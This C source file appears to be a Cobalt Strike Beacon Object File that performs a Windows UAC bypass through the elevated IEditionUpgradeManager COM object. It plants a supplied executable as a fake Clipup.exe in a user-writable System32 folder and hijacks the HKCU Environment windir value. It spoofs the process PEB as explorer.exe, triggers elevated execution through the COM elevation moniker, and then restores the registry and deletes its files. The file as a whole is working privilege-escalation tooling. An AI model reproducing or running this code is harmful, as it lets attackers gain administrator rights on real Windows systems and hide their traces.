// x86_64-w64-mingw32-gcc -c EditionUpgradeManagerBOF.c -w -o EditionUpgradeManagerBOF.o
#include <windows.h>
#include <stdio.h>
#include "ntos.h"
#include "beacon.h"

// common functions
DECLSPEC_IMPORT     WINBASEAPI char * __cdecl MSVCRT$strcpy(char * __restrict__ __dst, const char * __restrict__ __src);
DECLSPEC_IMPORT     WINBASEAPI LPSTR WINAPI MSVCRT$strcat(char *strDestination, const char *strSource);
DECLSPEC_IMPORT     WINBASEAPI size_t __cdecl MSVCRT$strlen(const char *_Str);
DECLSPEC_IMPORT     WINBASEAPI void *__cdecl MSVCRT$malloc(size_t size);
DECLSPEC_IMPORT     WINBASEAPI wchar_t *__cdecl MSVCRT$wcscpy(wchar_t * __restrict__ _Dest, const wchar_t * __restrict__ _Source);
DECLSPEC_IMPORT     WINBASEAPI wchar_t *__cdecl MSVCRT$wcscat(wchar_t * __restrict__ _Dest,const wchar_t * __restrict__ _Source);
DECLSPEC_IMPORT     WINBASEAPI int __cdecl MSVCRT$swprintf(wchar_t *__stream, const wchar_t *__format, ...);
DECLSPEC_IMPORT     WINBASEAPI void __cdecl MSVCRT$free(void *_Memory);
DECLSPEC_IMPORT     WINBASEAPI int WINAPI KERNEL32$MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
DECLSPEC_IMPORT     WINBASEAPI BOOL WINAPI KERNEL32$CreateDirectoryW(LPCTSTR, LPSECURITY_ATTRIBUTES);
DECLSPEC_IMPORT     WINBASEAPI BOOL WINAPI KERNEL32$CopyFileA(LPCTSTR, LPCTSTR, BOOL);
DECLSPEC_IMPORT     WINBASEAPI BOOL WINAPI KERNEL32$DeleteFileA(LPCSTR);
DECLSPEC_IMPORT     WINBASEAPI BOOL WINAPI KERNEL32$RemoveDirectoryA(LPCSTR);
DECLSPEC_IMPORT     WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
DECLSPEC_IMPORT     WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
DECLSPEC_IMPORT     WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT     WINBASEAPI VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
DECLSPEC_IMPORT     WINBASEAPI BOOL WINAPI SHLWAPI$PathFileExistsA(LPCSTR pszPath);
DECLSPEC_IMPORT     WINBASEAPI BOOL WINAPI SHLWAPI$PathFileExistsW(LPCTSTR);
DECLSPEC_IMPORT     WINBASEAPI BOOLEAN WINAPI ADVAPI32$GetUserNameA(LPSTR lpNameBuffer, LPDWORD nSize);
DECLSPEC_IMPORT     WINBASEAPI DWORD WINAPI KERNEL32$GetFileAttributesA(LPCSTR lpFileName);
DECLSPEC_IMPORT     WINBASEAPI BOOL WINAPI KERNEL32$CreateDirectoryA(LPCTSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
DECLSPEC_IMPORT     WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(void);

// registry functions
DECLSPEC_IMPORT     WINADVAPI LONG WINAPI ADVAPI32$RegCloseKey(HKEY hKey);
DECLSPEC_IMPORT     WINADVAPI LONG WINAPI ADVAPI32$RegCreateKeyA(HKEY hKey,LPCSTR lpSubKey,PHKEY phkResult);
DECLSPEC_IMPORT     WINADVAPI LONG WINAPI ADVAPI32$RegCreateKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD Reserved,LPSTR lpClass,DWORD dwOptions,REGSAM samDesired,LPSECURITY_ATTRIBUTES lpSecurityAttributes,PHKEY phkResult,LPDWORD lpdwDisposition);
DECLSPEC_IMPORT     WINADVAPI LONG WINAPI ADVAPI32$RegDeleteTreeA(HKEY base, LPCSTR subkey);
DECLSPEC_IMPORT     WINADVAPI LONG WINAPI ADVAPI32$RegSaveKeyExA(HKEY hKey,LPCSTR lpFile,LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD Flags);
DECLSPEC_IMPORT     WINADVAPI LONG WINAPI ADVAPI32$RegSetValueExA(HKEY hKey,LPCSTR lpValueName,DWORD Reserved,DWORD dwType,CONST BYTE *lpData,DWORD cbData);
DECLSPEC_IMPORT     WINADVAPI LONG WINAPI ADVAPI32$RegOpenKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD ulOptions,REGSAM samDesired,PHKEY phkResult);

// Added for EditionUpgradeManager UAC Bypass
DECLSPEC_IMPORT     NTSYSAPI VOID NTAPI NTDLL$RtlInitUnicodeString(PUNICODE_STRING DestinationString, PWSTR SourceString);
DECLSPEC_IMPORT     NTSYSAPI VOID NTAPI NTDLL$RtlAcquirePebLock(VOID);
DECLSPEC_IMPORT     NTSYSAPI VOID NTAPI NTDLL$RtlReleasePebLock(VOID);
DECLSPEC_IMPORT     WINBASEAPI NTSTATUS NTAPI NTDLL$NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID * BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
DECLSPEC_IMPORT     WINBASEAPI NTSTATUS NTAPI NTDLL$LdrEnumerateLoadedModules(BOOLEAN ReservedFlag, PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION EnumProc, PVOID Context);
DECLSPEC_IMPORT     WINBASEAPI int WINAPI OLE32$StringFromGUID2(REFGUID rguid, LPOLESTR lpsz, int cchMax);
DECLSPEC_IMPORT     WINBASEAPI HRESULT WINAPI OLE32$CLSIDFromString(LPCOLESTR lpsz, LPCLSID pclsid);
DECLSPEC_IMPORT     WINBASEAPI HRESULT WINAPI OLE32$IIDFromString(LPCOLESTR lpsz, LPIID lpiid);
DECLSPEC_IMPORT     WINBASEAPI HRESULT WINAPI OLE32$CoInitialize(LPVOID pvReserved);
DECLSPEC_IMPORT     WINBASEAPI INT WINAPI KERNEL32$RtlZeroMemory(void *data, size_t size);
DECLSPEC_IMPORT     WINBASEAPI HRESULT WINAPI OLE32$CoGetObject(wchar_t*, BIND_OPTS*, REFIID, void** ppv);
DECLSPEC_IMPORT     WINBASEAPI HRESULT WINAPI OLE32$CoInitializeEx(LPVOID pvReserved, DWORD dwCoInit);
DECLSPEC_IMPORT     WINBASEAPI HRESULT WINAPI OLE32$CoUninitialize(void);

typedef interface IEditionUpgradeManager IEditionUpgradeManager;

typedef struct IEditionUpgradeManagerVtbl {

    BEGIN_INTERFACE

    HRESULT(STDMETHODCALLTYPE *QueryInterface)(
        __RPC__in IEditionUpgradeManager * This,
        __RPC__in REFIID riid,
        _COM_Outptr_  void **ppvObject);

    ULONG(STDMETHODCALLTYPE *AddRef)(
        __RPC__in IEditionUpgradeManager * This);

    ULONG(STDMETHODCALLTYPE *Release)(
        __RPC__in IEditionUpgradeManager * This);

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE *InitializeWindow)(
        __RPC__in IEditionUpgradeManager * This
        );

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE *UpdateOperatingSystem)(
        __RPC__in IEditionUpgradeManager * This
        );

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE *ShowProductKeyUI)(
        __RPC__in IEditionUpgradeManager * This
        );

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE *UpdateOperatingSystemWithParams)(
        __RPC__in IEditionUpgradeManager * This
        );

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE *AcquireModernLicenseForWindows)(
        __RPC__in IEditionUpgradeManager * This
        );

    HRESULT(STDMETHODCALLTYPE *AcquireModernLicenseWithPreviousId)(
        __RPC__in IEditionUpgradeManager * This,
        __RPC__in LPWSTR PreviousId,
        __RPC__in DWORD *Data
        );

    //incomplete, irrelevant
    END_INTERFACE

} *PIEditionUpgradeManagerVtbl;

interface IEditionUpgradeManager
{
    CONST_VTBL struct IEditionUpgradeManagerVtbl *lpVtbl;
};

// globals for callback and module
PWSTR ImageFileName = NULL;
PWSTR CommandLine = NULL;

// enumerate modules callback handler
VOID NTAPI LdrEnumModulesCallback(_In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry, _In_ PVOID Context, _Inout_ BOOLEAN* StopEnumeration)
{
    //PPEB Peb = NtCurrentPeb();
    PPEB Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    SIZE_T      RegionSize = PAGE_SIZE;
    PWSTR FullDllName = ImageFileName;
    PWSTR BaseDllName = CommandLine;
    if (DataTableEntry->DllBase == Peb->ImageBaseAddress) {
        NTDLL$RtlInitUnicodeString(&DataTableEntry->FullDllName, FullDllName);
        NTDLL$RtlInitUnicodeString(&DataTableEntry->BaseDllName, BaseDllName);
        *StopEnumeration = TRUE;
    }
    else {
        *StopEnumeration = FALSE;
    }
}


int go(char * args, unsigned long length) {

    // get arguments
    datap parser;
    size_t dwBytesToWrite;
    BeaconDataParse(&parser, args, length);
    //dwBytesToWrite = BeaconDataInt(&parser);
    //unsigned char * DataBuffer = BeaconDataExtract(&parser, NULL);
    
    unsigned char * cmdPath = BeaconDataExtract(&parser, NULL);
    char targetExePath[MAX_PATH] = {0};
    MSVCRT$strcpy(targetExePath, cmdPath);
    BeaconPrintf(CALLBACK_OUTPUT, "targetExePath: %s\n", targetExePath);

    // Get current username and set the tempPath to the current user's Downloads directory
    // If the current username is not found or the path is invalid, use 'C:\Users\Public\Downloads\' instead
    char tempPath[MAX_PATH] = "C:\\Users\\";
    char username[257];
    DWORD username_len = 257;
    BOOL success = ADVAPI32$GetUserNameA(username, &username_len);
    //BOOL success = 0; // test GetUserName failure
    if (success) {
        MSVCRT$strcat(tempPath, username);
        MSVCRT$strcat(tempPath, "\\Downloads");
        DWORD attributes = KERNEL32$GetFileAttributesA(tempPath);
        if (attributes == INVALID_FILE_ATTRIBUTES) {
            BeaconPrintf(CALLBACK_ERROR, "Path based on current username is invalid: %d\n", KERNEL32$GetLastError());
            MSVCRT$strcpy(tempPath, "C:\\Users\\Public\\Downloads");
            BeaconPrintf(CALLBACK_OUTPUT, "Using the following path instead: %s\n", tempPath);
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get current username: %d\n", KERNEL32$GetLastError());
        MSVCRT$strcat(tempPath, "Public\\Downloads");
        BeaconPrintf(CALLBACK_OUTPUT, "Using the following path instead: %s\n", tempPath);
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Writing temporary files to: %s\n", tempPath);

    // define and format required strings
    char tempSystem32[100] = {0};
    char targetBinLocation[100] = {0};
    MSVCRT$strcat(tempSystem32, tempPath);
    MSVCRT$strcat(tempSystem32, "\\System32");
    MSVCRT$strcat(targetBinLocation, tempSystem32);
    MSVCRT$strcat(targetBinLocation, "\\Clipup.exe");

    // Create temp System32 directory
    BOOL test = KERNEL32$CreateDirectoryA(tempSystem32, NULL);
    if (test == 0 && KERNEL32$GetLastError() != 183) {
        BeaconPrintf(CALLBACK_ERROR, "Error creating new System32 directory\n");
        return;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully created new System32 directory\n");
    }

    // Copy supplied EXE to target location
    int result = KERNEL32$CopyFileA(targetExePath, targetBinLocation, FALSE);
    if (result != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully copied target binary to temp System32 directory\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Failed to copy target binary to temp System32 directory! Exiting.\n");
        return;
    }

    // Create windir reg key and/or open handle to it
    HKEY windirKey;
    if(ADVAPI32$RegCreateKeyA(HKEY_CURRENT_USER, "Environment", &windirKey)!=ERROR_SUCCESS) return 1;

    // set windir reg key to writable dir
    LSTATUS regStatus = ADVAPI32$RegSetValueExA(windirKey, "windir", 0, REG_SZ, tempPath, MSVCRT$strlen(tempPath));
    if (regStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Error setting windir registry key!: %d\n", regStatus);
        return;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully modified HKCU:Environment\\windir registry key!\n");
    }

    //spoof explorer.exe PEB for elevated COM access
    NTSTATUS Status;
    WCHAR szMoniker[MAX_PATH];
    SIZE_T RegionSize = PAGE_SIZE;
    BOOL bRestore = FALSE;
    HRESULT hRes = E_FAIL, hInit = E_FAIL;
    PVOID ElevatedObject = NULL, ElevatedObject2 = NULL;
    PPEB Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    NTDLL$RtlAcquirePebLock();
    Status = NTDLL$NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&ImageFileName, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (NT_SUCCESS(Status)) {
        // should calculate these from the actual system root via environment
        MSVCRT$wcscpy(ImageFileName, L"c:\\Windows\\");
        MSVCRT$wcscat(ImageFileName, L"explorer.exe");
    }
    Status = NTDLL$NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&CommandLine, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (NT_SUCCESS(Status)) {
        MSVCRT$wcscpy(CommandLine, L"explorer.exe");
    }
    NTDLL$RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, ImageFileName);
    NTDLL$RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, CommandLine);
    NTDLL$LdrEnumerateLoadedModules(0, &LdrEnumModulesCallback, &bRestore);
    NTDLL$RtlReleasePebLock();

    // create IEditionUpgradeManager elevated COM object
    IID IID_IEditionUpgradeManager;
    HRESULT hr;
    IEditionUpgradeManager *Manager = NULL;
    BIND_OPTS3 bop;
    WCHAR szBuffer[MAX_PATH + 1];
    DWORD Data[4];
    if (SUCCEEDED(OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE))) {
        
        if (OLE32$IIDFromString(L"{F2DCB80D-0670-44BC-9002-CD18688730AF}", &IID_IEditionUpgradeManager) == S_OK) {

            KERNEL32$RtlZeroMemory(szBuffer, sizeof(szBuffer));

            MSVCRT$wcscpy(szBuffer, L"Elevation:Administrator!new:{17CCA47D-DAE5-4E4A-AC42-CC54E28F334A}");

            KERNEL32$RtlZeroMemory(&bop, sizeof(bop));
            bop.cbStruct = sizeof(bop);
            bop.dwClassContext = CLSCTX_LOCAL_SERVER;

            hr = OLE32$CoGetObject(szBuffer, (BIND_OPTS *)&bop, &IID_IEditionUpgradeManager, &Manager);

            if (SUCCEEDED(hr)) {
                Data[0] = 2;
                Data[1] = 0;
                Data[2] = 2;
                Data[3] = 0;

                // call AcquireModernLicenseWithPreviousId method from elevated COM object, which will execute Clipup.exe from the created directory
                BeaconPrintf(CALLBACK_OUTPUT, "Calling AcquireModernLicenseWithPreviousId method from elevated COM object...\n");
                Manager->lpVtbl->AcquireModernLicenseWithPreviousId(Manager, L"pe386", (DWORD*)&Data);
                Manager->lpVtbl->Release(Manager);
            }
        }
    }

    // reset windir key to it's default value
    char ogWinDir[MAX_PATH] = "C:\\Windows";
    regStatus = ADVAPI32$RegSetValueExA(windirKey, "windir", 0, REG_SZ, ogWinDir, MSVCRT$strlen(ogWinDir));
    if (regStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Error setting windir registry key!: %d\n", regStatus);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully reset the HKCU:Environment\\windir registry key to it's original value!\n");
    }

    // close handle to reg key
    ADVAPI32$RegCloseKey(windirKey);
    
    // Sleep for 2 seconds to allow for elevated process to finish terminating
    KERNEL32$Sleep(2000);

    // delete exe from created directory
    result = KERNEL32$DeleteFileA(targetBinLocation);
    if (result != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "File deleted succesfully: %s\n", targetBinLocation);
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "Failed to delete '%s' in the fake windows folder: %d\n", targetBinLocation, KERNEL32$GetLastError());
    }

    // delete created directory
    result = KERNEL32$RemoveDirectoryA(tempSystem32);
    if (result != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "Folder deleted succesfully: %s\n", tempSystem32);
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "Failed to delete folder %s: %d\n", tempSystem32, KERNEL32$GetLastError());
    }

    return;

}